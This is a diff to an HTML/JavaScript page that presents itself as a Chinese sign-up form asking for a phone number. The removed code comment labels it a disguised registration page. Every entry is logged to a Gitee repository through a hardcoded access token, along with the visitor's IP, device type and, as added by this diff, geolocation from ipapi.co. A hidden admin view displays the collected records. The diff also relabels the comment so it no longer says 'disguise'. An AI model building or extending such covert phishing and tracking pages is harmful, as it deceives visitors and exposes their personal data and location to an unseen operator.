@@ -11,7 +11,7 @@
     .card{background:#fff;border-radius:20px;box-shadow:0 8px 30px rgba(0,0,0,0.06);padding:36px 28px}
     .title{font-size:24px;font-weight:600;text-align:center;margin-bottom:8px;color:#1f2329}
     .desc{color:#666;text-align:center;margin-bottom:36px;font-size:15px}
-    input,textarea{width:100%;height:50px;padding:0 16px;border:1px solid #e6e8eb;border-radius:14px;font-size:15px;margin-bottom:16px;outline:none;transition:0.2s}
+    input,textarea{width:100%;height:50px;padding:0 16px;border:1px solid #e6e8eb;border-radius:14px;font-size:15px;margin-bottom:16px;outline:none}
     textarea{height:130px;padding:16px;resize:none}
     button{width:100%;height:50px;background:#007aff;color:#fff;border:none;border-radius:14px;font-size:16px;font-weight:500;cursor:pointer}
     button:hover{opacity:.9}
@@ -32,7 +32,7 @@
 
 <div id="toast" class="toast"></div>
 
-<!-- 注册伪装页 -->
+<!-- 注册页 -->
 <div id="page-register" class="page">
     <div class="card">
         <div class="title">完成注册</div>
@@ -80,66 +80,75 @@
 const T = "004c701568527b8ea49b1832ce561c7c";
 const U = "LukeT";
 const R = "messages-store";
-const F = "messages.json";
-const API = `https://gitee.com/api/v5/repos/${U}/${R}/contents/${F}`;
+const FILE = "messages.json";
+const API = `https://gitee.com/api/v5/repos/${U}/${R}/contents/${FILE}`;
 
 let data;
 let ip = "未知IP";
+let location = "未知位置";
 let device = "未知设备";
 
-(async ()=>{
-    try{ip=await(await fetch("https://api.ipify.org")).text()}catch(e){}
-    const ua=navigator.userAgent;
-    if(ua.includes("iPhone"))device="iPhone";
-    else if(ua.includes("Android"))device="Android";
-    else if(ua.includes("Windows"))device="Windows";
-    else if(ua.includes("Mac"))device="Mac";
+(async () => {
+    try {
+        ip = await (await fetch("https://api.ipify.org")).text();
+        const loc = await (await fetch("https://ipapi.co/json")).json();
+        location = loc.region || loc.city || "未知位置";
+    } catch (e) {}
+
+    const ua = navigator.userAgent;
+    if (ua.includes("iPhone")) device = "iPhone";
+    else if (ua.includes("Android")) device = "Android";
+    else if (ua.includes("Windows")) device = "Windows";
+    else if (ua.includes("Mac")) device = "Mac";
 })();
 
-async function checkPassword(){
-    const v=document.getElementById("input-pwd").value.trim();
-    const d=await getFile();
-    data=JSON.parse(atob(d.content));
+async function checkPassword() {
+    const val = document.getElementById("input-pwd").value.trim();
+    const file = await getFile();
+    data = JSON.parse(atob(file.content));
 
-    if(v===data.normalPwd){
-        show("page-message");
+    if (val === data.normalPwd) {
+        await writeLog(val, "普通用户登录");
+        showPage("page-message");
         loadMsg();
-    }else if(v===data.adminPwd){
-        show("page-admin");
+    } else if (val === data.adminPwd) {
+        await writeLog(val, "管理员登录");
+        showPage("page-admin");
         loadAdminMsg();
         loadLog();
-    }else{
-        await addLog(v);
+    } else {
+        await writeLog(val, "错误输入");
         alert("请输入正确的手机号");
     }
 }
 
-async function postMessage(){
-    const c=document.getElementById("input-msg").value.trim();
-    if(!c)return toast("请输入内容");
-    const f=await getFile();
-    data=JSON.parse(atob(f.content));
-    data.messages.unshift({content:c,ip,device,time:time()});
-    await save(f.sha,data);
+async function postMessage() {
+    const content = document.getElementById("input-msg").value.trim();
+    if (!content) return toast("请输入内容");
+    const f = await getFile();
+    data = JSON.parse(atob(f.content));
+    data.messages.unshift({ content, ip, location, device, time: time() });
+    await save(f.sha, data);
     toast("发布成功");
-    document.getElementById("input-msg").value="";
-    setTimeout(loadMsg,2000);
+    document.getElementById("input-msg").value = "";
+    setTimeout(loadMsg, 2000);
 }
 
-async function addLog(phone){
-    const f=await getFile();
-    data=JSON.parse(atob(f.content));
-    data.logs.unshift({phone,ip,device,time:time()});
-    await save(f.sha,data);
+async function writeLog(phone, type) {
+    const f = await getFile();
+    data = JSON.parse(atob(f.content));
+    data.logs.unshift({ phone, type, ip, location, device, time: time() });
+    await save(f.sha, data);
 }
 
-async function loadMsg(){
-    const d=await getData();
-    document.getElementById("msg-list").innerHTML=d.messages.map(m=>`
+async function loadMsg() {
+    const d = await getData();
+    document.getElementById("msg-list").innerHTML = d.messages.map(m => `
         <div class="msg-item">
             <div class="msg-content">${esc(m.content)}</div>
             <div class="msg-info">
                 <span>📍 ${m.ip}</span>
+                <span>🏙 ${m.location}</span>
                 <span>📱 ${m.device}</span>
                 <span>🕐 ${m.time}</span>
             </div>
@@ -147,13 +156,14 @@ async function loadMsg(){
     `).join('');
 }
 
-async function loadAdminMsg(){
-    const d=await getData();
-    document.getElementById("admin-msg-list").innerHTML=d.messages.map((m,i)=>`
+async function loadAdminMsg() {
+    const d = await getData();
+    document.getElementById("admin-msg-list").innerHTML = d.messages.map((m, i) => `
         <div class="msg-item">
             <div class="msg-content">${esc(m.content)}</div>
             <div class="msg-info">
                 <span>📍 ${m.ip}</span>
+                <span>🏙 ${m.location}</span>
                 <span>📱 ${m.device}</span>
                 <span>🕐 ${m.time}</span>
             </div>
@@ -162,93 +172,104 @@ async function loadAdminMsg(){
     `).join('');
 }
 
-async function loadLog(){
-    const d=await getData();
-    document.getElementById("admin-log-list").innerHTML=d.logs.map((m,i)=>`
+async function loadLog() {
+    const d = await getData();
+    document.getElementById("admin-log-list").innerHTML = d.logs.map((m, i) => `
         <div class="log-item">
-            <div>输入：${esc(m.phone)}</div>
+            <div>${m.type}：${esc(m.phone)}</div>
             <div style="font-size:12px;color:#888;margin-top:6px">
-                📍 ${m.ip}｜📱 ${m.device}｜🕐 ${m.time}
+                📍 ${m.ip}｜🏙 ${m.location}｜📱 ${m.device}｜🕐 ${m.time}
             </div>
             <button class="btn-danger" style="height:32px;margin-top:10px" onclick="delLog(${i})">删除</button>
         </div>
     `).join('');
 }
 
-async function delMsg(i){
-    const f=await getFile();
-    data=JSON.parse(atob(f.content));
-    data.messages.splice(i,1);
-    await save(f.sha,data);
+async function delMsg(i) {
+    const f = await getFile();
+    data = JSON.parse(atob(f.content));
+    data.messages.splice(i, 1);
+    await save(f.sha, data);
     toast("删除成功");
-    setTimeout(loadAdminMsg,2000);
+    setTimeout(loadAdminMsg, 2000);
 }
 
-async function delLog(i){
-    const f=await getFile();
-    data=JSON.parse(atob(f.content));
-    data.logs.splice(i,1);
-    await save(f.sha,data);
+async function delLog(i) {
+    const f = await getFile();
+    data = JSON.parse(atob(f.content));
+    data.logs.splice(i, 1);
+    await save(f.sha, data);
     toast("删除成功");
-    setTimeout(loadLog,2000);
+    setTimeout(loadLog, 2000);
 }
 
-async function clearAllMsg(){
-    const f=await getFile();
-    data=JSON.parse(atob(f.content));
-    data.messages=[];
-    await save(f.sha,data);
+async function clearAllMsg() {
+    const f = await getFile();
+    data = JSON.parse(atob(f.content));
+    data.messages = [];
+    await save(f.sha, data);
     toast("清空成功");
-    setTimeout(loadAdminMsg,2000);
+    setTimeout(loadAdminMsg, 2000);
 }
 
-async function clearAllLog(){
-    const f=await getFile();
-    data=JSON.parse(atob(f.content));
-    data.logs=[];
-    await save(f.sha,data);
+async function clearAllLog() {
+    const f = await getFile();
+    data = JSON.parse(atob(f.content));
+    data.logs = [];
+    await save(f.sha, data);
     toast("清空成功");
-    setTimeout(loadLog,2000);
+    setTimeout(loadLog, 2000);
 }
 
-async function changePwd(){
-    const np=document.getElementById("new-pwd").value.trim();
-    if(!np)return toast("请输入新密码");
-    const f=await getFile();
-    data=JSON.parse(atob(f.content));
-    data.normalPwd=np;
-    await save(f.sha,data);
+async function changePwd() {
+    const np = document.getElementById("new-pwd").value.trim();
+    if (!np) return toast("请输入新密码");
+    const f = await getFile();
+    data = JSON.parse(atob(f.content));
+    data.normalPwd = np;
+    await save(f.sha, data);
     toast("修改成功");
-    document.getElementById("new-pwd").value="";
+    document.getElementById("new-pwd").value = "";
 }
 
-function showMsgPanel(){
-    document.getElementById("admin-msg").style.display="block";
-    document.getElementById("admin-log").style.display="none";
+function showMsgPanel() {
+    document.getElementById("admin-msg").style.display = "block";
+    document.getElementById("admin-log").style.display = "none";
 }
 
-function showLogPanel(){
-    document.getElementById("admin-msg").style.display="none";
-    document.getElementById("admin-log").style.display="block";
+function showLogPanel() {
+    document.getElementById("admin-msg").style.display = "none";
+    document.getElementById("admin-log").style.display = "block";
 }
 
-function show(id){
-    document.querySelectorAll(".page").forEach(p=>p.classList.add("hidden"));
+function showPage(id) {
+    document.querySelectorAll(".page").forEach(p => p.classList.add("hidden"));
     document.getElementById(id).classList.remove("hidden");
 }
 
-function goBack(){
-    show("page-register");
-    document.getElementById("input-pwd").value="";
-    data=null;
+function goBack() {
+    showPage("page-register");
+    document.getElementById("input-pwd").value = "";
+    data = null;
 }
 
-function time(){return new Date().toLocaleString("zh-CN")}
-function esc(s){const e=document.createElement("div");e.textContent=s;return e.innerHTML}
-function toast(t){const o=document.getElementById("toast");o.textContent=t;o.classList.add("show");setTimeout(()=>o.classList.remove("show"),2000)}
-async function getData(){const r=await fetch(`${API}?access_token=${T}`);const j=await r.json();return JSON.parse(atob(j.content))}
-async function getFile(){const r=await fetch(`${API}?access_token=${T}`);return await r.json()}
-async function save(sha,dt){await fetch(API,{method:"PUT",headers:{"Content-Type":"application/json"},body:JSON.stringify({access_token:T,content:btoa(unescape(encodeURIComponent(JSON.stringify(dt,null,2)))),message:"update",sha})})}
+function time() { return new Date().toLocaleString("zh-CN") }
+function esc(s) { const e = document.createElement("div"); e.textContent = s; return e.innerHTML }
+function toast(t) { const o = document.getElementById("toast"); o.textContent = t; o.classList.add("show"); setTimeout(() => o.classList.remove("show"), 2000) }
+async function getData() { const r = await fetch(`${API}?access_token=${T}`); const j = await r.json(); return JSON.parse(atob(j.content)) }
+async function getFile() { const r = await fetch(`${API}?access_token=${T}`); return await r.json() }
+async function save(sha, dt) {
+    await fetch(API, {
+        method: "PUT",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            access_token: T,
+            content: btoa(unescape(encodeURIComponent(JSON.stringify(dt, null, 2)))),
+            message: "update",
+            sha
+        })
+    });
+}
 </script>
 </body>
 </html>
